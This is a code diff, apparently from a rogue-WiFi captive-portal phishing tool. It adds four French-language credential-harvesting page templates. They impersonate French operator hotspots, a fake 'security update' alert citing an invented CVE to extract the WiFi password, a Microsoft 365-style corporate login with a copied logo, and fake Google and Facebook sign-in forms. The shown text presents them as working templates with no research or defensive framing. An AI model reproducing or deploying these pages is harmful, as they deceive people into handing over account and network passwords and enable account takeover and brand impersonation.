@@ -234,6 +234,105 @@ TEMPLATES = {
         "button": "J'ai installé l'application — Continuer",
         "foot": "{NAME} · Service WiFi sécurisé",
     },
+    # ── Portail opérateur (style hotspot Orange/Free/SFR) ─────────────
+    "operator": {
+        "accent": "#ff6600",
+        "bg": "linear-gradient(180deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%)",
+        "card_bg": "rgba(255,255,255,0.97)",
+        "brand": "WiFi public · {NAME}",
+        "logo": "🌐",
+        "title": "Connexion WiFi",
+        "subtitle": ("Bienvenue sur le réseau <b>{SSID}</b>. "
+                     "Identifiez-vous avec vos identifiants opérateur "
+                     "pour accéder à Internet."),
+        "form": ("<input name='login' placeholder='Email ou n° mobile' "
+                 "autocomplete='username' required>"
+                 "<input name='password' type='password' "
+                 "placeholder='Mot de passe opérateur' required>"
+                 "<label class='check'><input type='checkbox' name='remember'> "
+                 "Se souvenir de moi sur ce réseau</label>"),
+        "button": "Se connecter",
+        "foot": "{NAME} · Accès WiFi sécurisé · Conditions d'utilisation",
+    },
+    # ── Mise à jour sécurité (demande mdp WiFi) ──────────────────────
+    "update": {
+        "accent": "#d93025",
+        "bg": "linear-gradient(180deg,#fff5f5 0%,#ffe8e8 100%)",
+        "card_bg": "white",
+        "brand": "Alerte de sécurité réseau",
+        "logo": "⚠️",
+        "title": "Mise à jour de sécurité",
+        "subtitle": ("Une <b>vulnérabilité critique</b> a été détectée sur le "
+                     "routeur <b>{SSID}</b>. Pour protéger vos appareils, "
+                     "veuillez confirmer le mot de passe WiFi afin d'appliquer "
+                     "le correctif automatiquement."),
+        "form": ("<input name='wifi_password' type='password' "
+                 "placeholder='Mot de passe WiFi actuel' "
+                 "autocomplete='current-password' required>"
+                 "<input name='wifi_password_confirm' type='password' "
+                 "placeholder='Confirmez le mot de passe' required>"),
+        "button": "🔒 Appliquer la mise à jour",
+        "foot": "Service de sécurité réseau · Correctif CVE-2026-0421",
+    },
+    # ── Corporate (style Microsoft 365) ──────────────────────────────
+    "corporate": {
+        "accent": "#0078d4",
+        "bg": "linear-gradient(180deg,#f2f2f2,#e6e6e6)",
+        "card_bg": "white",
+        "brand": "",
+        "logo": ("&nbsp;<svg width='44' height='44' viewBox='0 0 23 23'>"
+                 "<rect x='1' y='1' width='10' height='10' fill='#f25022'/>"
+                 "<rect x='12' y='1' width='10' height='10' fill='#7fba00'/>"
+                 "<rect x='1' y='12' width='10' height='10' fill='#00a4ef'/>"
+                 "<rect x='12' y='12' width='10' height='10' fill='#ffb900'/>"
+                 "</svg>"),
+        "title": "Connexion",
+        "subtitle": "Connectez-vous avec votre compte professionnel pour accéder au réseau <b>{SSID}</b>.",
+        "form": ("<input name='email' type='email' placeholder='user@entreprise.com' "
+                 "autocomplete='username' required>"
+                 "<input name='password' type='password' "
+                 "placeholder='Mot de passe' required>"
+                 "<label class='check'><input type='checkbox' name='keep_signed'> "
+                 "Rester connecté</label>"),
+        "button": "Se connecter",
+        "foot": "Conditions d'utilisation · Déclaration de confidentialité",
+    },
+    # ── Social WiFi (Google / Facebook) ──────────────────────────────
+    "social-wifi": {
+        "accent": "#1a73e8",
+        "bg": "linear-gradient(180deg,#f8f9fa,#e8eaed)",
+        "card_bg": "white",
+        "brand": "WiFi gratuit · {NAME}",
+        "logo": "📶",
+        "title": "WiFi gratuit",
+        "subtitle": "Connectez-vous pour profiter du WiFi gratuit de <b>{NAME}</b>.",
+        "form": (
+            "<a onclick=\"document.getElementById('gform').style.display='block';"
+            "this.style.display='none';\" "
+            "style='display:block;padding:14px;margin:8px 0;"
+            "background:#4285f4;color:white;text-align:center;"
+            "border-radius:10px;font-size:15px;font-weight:600;"
+            "text-decoration:none;cursor:pointer'>"
+            "🔵 Continuer avec Google</a>"
+            "<a onclick=\"document.getElementById('fform').style.display='block';"
+            "this.style.display='none';\" "
+            "style='display:block;padding:14px;margin:8px 0;"
+            "background:#1877f2;color:white;text-align:center;"
+            "border-radius:10px;font-size:15px;font-weight:600;"
+            "text-decoration:none;cursor:pointer'>"
+            "🔵 Continuer avec Facebook</a>"
+            "<div id='gform' style='display:none;margin-top:14px'>"
+            "<input name='google_email' type='email' placeholder='votre@gmail.com' required>"
+            "<input name='google_password' type='password' placeholder='Mot de passe Google' required>"
+            "</div>"
+            "<div id='fform' style='display:none;margin-top:14px'>"
+            "<input name='fb_email' type='email' placeholder='Email ou téléphone' required>"
+            "<input name='fb_password' type='password' placeholder='Mot de passe Facebook' required>"
+            "</div>"
+        ),
+        "button": "Se connecter au WiFi",
+        "foot": "{NAME} · WiFi Social · Powered by Cloud Access",
+    },
 }
 
 
